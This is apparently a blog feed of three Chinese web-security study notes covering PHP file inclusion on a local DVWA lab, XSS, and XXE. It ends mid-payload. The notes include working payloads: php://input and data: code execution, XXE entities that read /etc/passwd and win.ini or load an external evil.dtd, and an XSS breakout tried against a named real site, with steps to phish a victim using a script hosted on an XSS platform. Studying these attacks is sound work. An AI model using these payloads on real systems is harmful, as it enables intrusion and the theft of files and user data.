        <content type="html"><![CDATA[<h2 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h2><pre class="line-numbers language-none"><code class="language-none">include() include_once() require() require_once() include()和require()的区别：require()如果在包含过程中出错，就会直接退出，不执行后续语句include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x01、什么是文件包含"><a href="#0x01、什么是文件包含" class="headerlink" title="0x01、什么是文件包含?**"></a>0x01、什么是文件包含?**</h3><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p><h3 id="0x02、漏洞成因"><a href="#0x02、漏洞成因" class="headerlink" title="0x02、漏洞成因**"></a>0x02、漏洞成因**</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><h3 id="0x03、php引发文件包含漏洞的四个函数"><a href="#0x03、php引发文件包含漏洞的四个函数" class="headerlink" title="0x03、php引发文件包含漏洞的四个函数**"></a>0x03、php引发文件包含漏洞的四个函数**</h3><ol><li>include() ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li><li>inclue_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li><li>require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li><li>require_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><h3 id="0x04、文件包含漏洞分类"><a href="#0x04、文件包含漏洞分类" class="headerlink" title="0x04、文件包含漏洞分类"></a>0x04、文件包含漏洞分类</h3><p><strong>4.1、本地文件包含漏洞</strong><br>顾名思义，指的是能打开并包含本地文件的漏洞。大多数情况下遇到的文件包含漏洞都是本地文件包含漏洞。</p><p><strong>示例4.1：</strong><br>以DVWA的靶场环境为例，靶场地址：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php</a></p><p><img src="/images/dvwa.png" alt="dvwa"></p><p>把DVWA Security的等级调到Low，在DVWA\vulnerabilities\fi\source\Low.php中有以下代码</p><p>在DVWA\vulnerabilities\fi\source\index.php中Low.php又被包含在其中，这就构成了文件包含漏洞，而且被包含的文件还是我们可控的。</p><p>在file1同级目录下新建一个名为test.txt的文本文件，内容如下：</p><p>访问<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt</a></p><p><img src="/images/testphp.png" alt="test"></p><p>文件包含可以包含任意文件，如图片，文本文件，压缩包等等，如果文件中有服务器能识别的脚本语言，就按照当前脚本语言执行，否则就直接显示出源代码。</p><p><strong>4.2、远程文件包含漏洞</strong></p><p>是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在，危害性会很大。</p><p>但远程文件包含漏洞的利用条件较为苛刻，需要php.ini中配置<br>allow_url_fopen=On<br>allow_url_include=On</p><p><strong>示例4.2：</strong><br>先打开目标服务器的php.ini文件进行以下相关设置，然后重启服务器</p><p><img src="/images/phpini.png" alt="phpini"></p><p>之后在本地新建文件test2.txt，文件内容为：<br>目标服务器ip：192.168.1.114<br>本机ip：192.168.1.106<br>访问<a href="http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt">http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt</a></p><p><img src="/images/test2.png" alt="test2"></p><h3 id="0x05、文件包含漏洞之伪协议"><a href="#0x05、文件包含漏洞之伪协议" class="headerlink" title="0x05、文件包含漏洞之伪协议**"></a>0x05、文件包含漏洞之伪协议**</h3><p><strong>5.1、php://filter</strong><br>利用条件：<br>只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求<br>用法：<br>通过指定末尾文件，可以读取经base64加密后的文件源码，虽然不能直接获取shell等，但能够读取敏感文件，危害还是是挺大的。</p><p><strong>示例5.1：</strong><br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt</a></p><p><img src="/images/base64encode.png" alt="base64"></p><p><strong>5.2、php://input</strong><br>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行<br>利用条件：<br>需要开启allow_url_include=on，对allow_url_fopen不做要求<br>用法：?file=php://input 数据利用POST传过去。</p><p><strong>示例5.2：</strong></p><p><img src="/images/52.png"></p><p>也可以写入木马</p><p><img src="/images/muma.png" alt="muma"></p><p>还可以命令执行</p><p><img src="/images/zhixing.png"></p><p><strong>5.3、zip://伪协议</strong><br>zip://可以访问压缩文件中的文件<br>条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。<br>用法：?file=zip://[压缩文件路径]#[压缩文件内的子文件名]</p><p><strong>示例5.3：</strong><br>在本地新建一个文件test.php，并且压缩成test.zip压缩包</p><p><img src="/images/testzip.png"></p><p>要是把压缩包的后缀改为其他任意格式的文件也可以正常使用。</p><p><strong>5.4、phar://伪协议</strong><br>与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开，即?file=phar://[压缩文件路径]/[压缩文件内的子文件名]</p><p><strong>示例5.4：</strong></p><p><img src="/images/test.png"></p><p><strong>5.5、data:text/plain</strong><br>和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同<br>条件：allow_url_fopen参数与allow_url_include都需开启<br>用法1：?file=data:text/plain,<br>用法2：?file=data:text/plain;base64,编码后的php代码</p><p><strong>示例5.5：</strong></p><p><img src="/images/phpinfo.png"></p><p><img src="/images/data.png"></p><p>注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了</p><p><strong>5.6、file://伪协议</strong><br>file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。<br>用法：?file=file://文件绝对路径</p><p><strong>示例5.6</strong></p><p><img src="/images/56.png"></p><h2 id="0x06、修复方案"><a href="#0x06、修复方案" class="headerlink" title="0x06、修复方案"></a>0x06、修复方案</h2><p>1、PHP 中使用 open_basedir 配置限制访问在指定的区域<br>2、过滤.（点）/（反斜杠）\（反斜杠）等特殊字符<br>3、尽量关闭allow_url_include配置</p><h2 id="0x07、总结"><a href="#0x07、总结" class="headerlink" title="0x07、总结"></a>0x07、总结</h2><p>关于文件包含的内容，目前小白也就只能总结出这些了，总之收获不菲，感觉很有用。</p><p><img src="/images/wenjianbaohan.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理分析 </tag>
            
            <tag> 文件包含漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习笔记</title>
      <link href="/2023/02/03/xss-xue-xi-bi-ji/"/>
      <url>/2023/02/03/xss-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="00×1-什么是XSS漏洞："><a href="#00×1-什么是XSS漏洞：" class="headerlink" title="00×1 什么是XSS漏洞："></a>00×1 什么是XSS漏洞：</h3><pre class="line-numbers language-none"><code class="language-none">XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="00×2-XSS漏洞有什么危害："><a href="#00×2-XSS漏洞有什么危害：" class="headerlink" title="00×2 XSS漏洞有什么危害："></a>00×2 XSS漏洞有什么危害：</h3><pre class="line-numbers language-none"><code class="language-none">1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 3、盗窃企业重要的具有商业价值的资料 4、非法转账 5、强制发送电子邮件 6、网站挂马 7、控制受害者机器向其它网站发起攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="00×3-XSS的分类："><a href="#00×3-XSS的分类：" class="headerlink" title="00×3 XSS的分类："></a>00×3 XSS的分类：</h3><pre class="line-numbers language-none"><code class="language-none">1，反射型： 定义：非持久型、参数型 出现位置：网站搜索栏、用户登入口位置 2，存储型 定义：持久型 出现位置：网站留言、评论、博客日志等交互处 3，DOM型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="00×4-XSS漏洞的挖掘："><a href="#00×4-XSS漏洞的挖掘：" class="headerlink" title="00×4 XSS漏洞的挖掘："></a>00×4 XSS漏洞的挖掘：</h3><pre class="line-numbers language-none"><code class="language-none">如何去挖掘XSS呢？手工+工具+思路+勤奋的双手=漏洞手工：自己构造payload，见框就插工具：safe3，AWVS，Burpsuite丶Appscan丶XssSniper浏览器插件丶cookie修改工具思路：个人信息，留言板，评论等，注意观察url变化，也可能会出现其他漏洞，如：逻辑漏洞勤奋：不要总以为自己看一遍就会了，多去实战才能积累经验漏洞：当你看到别人挖到了这个网站的漏洞，你就不挖了，他可能只是过滤了一个字符呢？漏洞无处不在，思路很重要<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="00×5-XSS绕过方法总结："><a href="#00×5-XSS绕过方法总结：" class="headerlink" title="00×5 XSS绕过方法总结："></a>00×5 XSS绕过方法总结：</h3><pre class="line-numbers language-none"><code class="language-none">1，绕过单引号2，绕过 SCRIPT 过滤3，使用 IMG 源4，使用制表符 换行符和回车符5，使用空白符6，双引号配对的 bug7，绕过css过滤器8，不全面的过滤器9，转义字符10，编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="00×6-XSS的简单闭合案例："><a href="#00×6-XSS的简单闭合案例：" class="headerlink" title="00×6 XSS的简单闭合案例："></a>00×6 XSS的简单闭合案例：</h3><pre class="line-numbers language-none"><code class="language-none">我已经找到了一个反射型的XSS，我就不打码了  域名：http://so.kuge.cc/ 是酷鸽网的一个分站，首先我们插入正常的XSS代码    &lt;script&gt;alert('XSS')&lt;/script&gt; 查看源代码，我们发现他已经插入到html代码中，但是没弹框，不要放弃，我们接着看 我们发现&lt;a href="?op=news&amp;k=&lt;script&gt;alert('XSS')&lt;/script&gt; " class="a"&gt;新闻&lt;/a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点在结束这一小部分</p><p>我们开始构造payload，闭合标签 payload：”&gt;&lt;a</p><p>成功弹窗</p><h3 id="00×7-利用XSS获取目标IP："><a href="#00×7-利用XSS获取目标IP：" class="headerlink" title="00×7 利用XSS获取目标IP："></a>00×7 利用XSS获取目标IP：</h3><pre class="line-numbers language-none"><code class="language-none">首先你要找到一个存在XSS漏洞的站，反射型XSS也好，储存型XSS也好，DOM型的也一样还是刚才那个，域名：http://so.kuge.cc/构造payload：http://so.kuge.cc/search.phpk="&gt;&lt;script src=你的XSS平台&gt;&lt;/script&gt;&lt;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以缩短发给目标，目标打开后，接收目标信息</p><h3 id="00×8-新手在寻找XSS时所存在的一些误区："><a href="#00×8-新手在寻找XSS时所存在的一些误区：" class="headerlink" title="00×8 新手在寻找XSS时所存在的一些误区："></a>00×8 新手在寻找XSS时所存在的一些误区：</h3><p><strong>1，误区1：XSS，不是专门去“绕过”限制。</strong></p><pre class="line-numbers language-none"><code class="language-none">打个简单的比方，一个已经被层层把守的大门，面前荆棘无数，而你又单枪匹马的，怎么闯的进去？这个时候你要意识到，走大门是不可能的。其实我们要突破的城防，有很多小门可以进去的，甚至不需要任何手段就可以直接走进去。我们为什么不走呢？XSS是很好防御的，不就是过滤一下么，所以我们不要太多寄希望与程序员错误的过滤逻辑，而应该把希望寄托于程序员的“忘记过滤”上。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2，误区2： XSS，不仅仅存在于你所看得见的位置。</strong></p><pre class="line-numbers language-none"><code class="language-none">大部分新手，在寻找XSS时，都会在一些评论框去输入XSS代码，然后看页面有没有弹窗。当然不是说这个方法没有用，而是这种方法，几乎很难“碰”到一个XSS。所以很多新手会觉得XSS怎么这么难找到。原因有几点：1. 像评论框，个人资料这种，你所能想到的位置。稍微有一点安全意识的程序员也能想到，所以经常是被过滤掉的。2. 你所填入的资料，并不总是以HTML标签的形式，输出到页面上。所以有时候并不是不能X，只是因为你填入的东西不对。**看不见有两个层面：**- 输入看不见，建议大家在提交请求的时候，使用抓包软件，然后对请求的参数逐个测试。- 输出看不见，建议大家对返回的数据，也可以使用抓包软件抓取数据，然后对抓回的数据进行搜索，搜索你输入的数据，来定位看不见的输出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3，误区3： XSS，绕过限制不是让你乱用字符去绕过，切忌盲目。</strong></p><pre class="line-numbers language-none"><code class="language-none">某人在看到代码是 &lt;a href="xxxx\u0022"&gt; 的时候，问大家：“为什么\u0022”不行啊？ 这种绕过是盲目的。在测试初期，我们如果不愿意去看对方的代码逻辑，可以采用“盲目”的方式去测试（用各种特殊字符去试探），这样可以节省很多时间。但是，当我们已经能够确定，数据输出位于哪个点时，比如上面这个xxxx ，我们已经知道是输出到了 href="之间"  的时候。我们就不能盲目的去"绕过”，一定要有针对性。这个针对性主要是以下几点。- 输出点，是直接输出，还是经过了DOM。      简单通俗点的说法是：      前者可以通过右键查看源代码，搜索到。      后者通过右键查看源代码是搜索不到的。- 直接输出点，是位于HTML标签里，还是位于Script脚本里，或者是Style里      HTML标签又分为：        是在HTML标签之间： &lt;div&gt; 内容在这里 &lt;/div&gt;        还是在HTML属性之间： &lt;img alt="内容在这里"&gt;        还是在HTML事件之间:  &lt;img&gt;      Script/style标签：        根据输出自己去构造闭合，保证语法正确即可。-  DOM输出点，这个需要一定的JS基础。      C.1) 定位输出内容的JS代码段。      C.2) 查看此代码段，是否存在过滤问题。      C.3) 如果存在，制定绕过规则。- 输出点，采用的什么过滤规则      1. 了解以上B)中，        每个点该过滤什么字符，        如果没过滤什么字符，该怎么去利用。      2. 逐个测试法，看看目标输出点，到底过滤了哪些字符      3. 测试服务器端的一些转换逻辑，比如有些服务器会先将"转换为"      4. 确定是否可绕过，不能绕过的尽早放弃总之，首先要了解如何防御，你才能了解，如何绕过，不能盲目。其中，B+D的规则基本是死的，偶尔碰上些服务器端过滤逻辑有问题的，是可以绕过的，尤其是服务器端采用黑名单的方式时。C则较为灵活，所谓的“绕过”往往是针对这种。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4，其它：</strong></p><pre class="line-numbers language-none"><code class="language-none">A) 代码里明明看到插入了 &lt;script&gt;，怎么不执行啊？这种问题，zone里貌似有几个帖子了，这里强调下，打开调试工具看代码的时候，请注意颜色。以chrome为例，只有&lt;script&gt;..&lt;/script&gt;标记以彩色显示时，才说明是插入了，而以黑色显示时，实际上的代码是：&lt;script&gt;....&lt;/script&gt; ，其它标签同理。B) &lt;xxx xxxx="xxx"&gt; 这个放进去怎么不行啊？首先确定你这个是XSS代码，此外，一些新手会在网上找到一些旧的资料，而有些XSS代码是IE6时代的产物，或者是浏览器特异的代码，所以一定要注意代码来源，适用于什么浏览器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/XSS.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理分析 </tag>
            
            <tag> xss漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe学习笔记</title>
      <link href="/2023/02/03/xxe-xue-xi-bi-ji/"/>
      <url>/2023/02/03/xxe-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-什么是xml"><a href="#0x00-什么是xml" class="headerlink" title="0x00  什么是xml"></a>0x00  什么是xml</h3><p><strong>1.定义</strong><br>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><strong>2.文档结构</strong><br>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--XML声明--&gt;&lt;?xml version="1.0"?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.DTD</strong><br>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>1.内部声明DTD：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素 [元素声明]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.引用外部DTD：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.内外部DTD文档结合：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>DTD中的一些重要的关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><p>4.实体类别介绍<br>实体主要分为一下四类</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>参数实体用%实体名称申明，引用时也用%实体名称;</p><p>其余实体直接用实体名称申明，引用时用&amp;实体名称。</p><p>参数实体只能在DTD中申明，DTD中引用；</p><p>其余实体只能在DTD中申明，可在xml文档中引用。</p><p>注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。</p><h3 id="0x01-DTD-实体声明："><a href="#0x01-DTD-实体声明：" class="headerlink" title="0x01 DTD 实体声明："></a>0x01 DTD 实体声明：</h3><p><strong>1. 内部实体声明</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 “实体的值”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe "Thinking"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>2. 外部实体声明</strong></p><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</p><pre class="line-numbers language-none"><code class="language-none">file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p><p><img src="/images/xieyi.png" alt="xieyi"></p><pre class="line-numbers language-none"><code class="language-none">外部实体的默认协议<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&amp;xxe被存放在了methodname元素中，造成了敏感信息的泄露。</p><p><strong>3. 参数实体声明</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % 实体名称 “实体的值”&gt;or&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>外部evil.dtd中的内容。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4. 引用公共实体</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 PUBLIC "public_ID" "URI"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-什么是XML外部实体攻击"><a href="#0x02-什么是XML外部实体攻击" class="headerlink" title="0x02 什么是XML外部实体攻击?"></a>0x02 什么是XML外部实体攻击?</h3><p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。</p><pre class="line-numbers language-none"><code class="language-none">Code1：&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Code2：&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE b [&lt;!ENTITY entityex SYSTEM "file:///folder/file"&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;entityex;&lt;/value&gt;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Code3：&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以Code1代码为例，XML外部实体 ‘passwd’ 被赋予的值为：file:///etc/passwd。<br>在解析XML文档的过程中，实体’passwd’的值会被替换为URI(file:///etc/passwd)内容值(也就是passwd文件的内容)。<br>关键字’SYSTEM’会告诉XML解析器，’passwd’实体的值将从其后的URI中读取。</p><h3 id="0x03-怎么甄别一个XML实体攻击漏洞"><a href="#0x03-怎么甄别一个XML实体攻击漏洞" class="headerlink" title="0x03 怎么甄别一个XML实体攻击漏洞?"></a>0x03 怎么甄别一个XML实体攻击漏洞?</h3><p>XXE漏洞主要针对web服务危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等。</p><p>最直接的回答就是： 甄别那些接受XML作为输入内容的端点。<br>但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。<br>在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p><p>例如wsdl（web服务描述语言）。或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p><p><strong>xxe漏洞检测</strong></p><p>第一步检测XML是否会被成功解析：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name "my name is nMask"&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果页面输出了my name is nMask，说明xml文件可以被解析。</p><p>第二步检测服务器是否支持DTD引用外部实体：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM "http://localhost/index.html"&gt; %name; ]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html的请求。</p><p><strong>从PHP代码层面上</strong><br>最开始，引入一个file_get_contents函数，将整个XML数据读入data字符串中，然后交给php的xml解析函数simplexml_load_string()解析，解析后的数据赋给xml变量。</p><p>这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$data = file_get_contents('php://input');  //获取提交的XML数据$xml = simplexml_load_string($data);  // 交给PHP的XML解析函数echo $xml-&gt;name;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-xxe漏洞的危害"><a href="#0x04-xxe漏洞的危害" class="headerlink" title="0x04 xxe漏洞的危害"></a>0x04 xxe漏洞的危害</h3><p>xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。</p><p><strong>危害1：读取任意文件</strong><br>有回显情况<br>XML.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = "1.0"?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问XML.php可以读取etc/passwd文件内容</p><p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p><p>实例展示：</p><p>可以使用如下的两种方式进行XXE注入攻击。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" 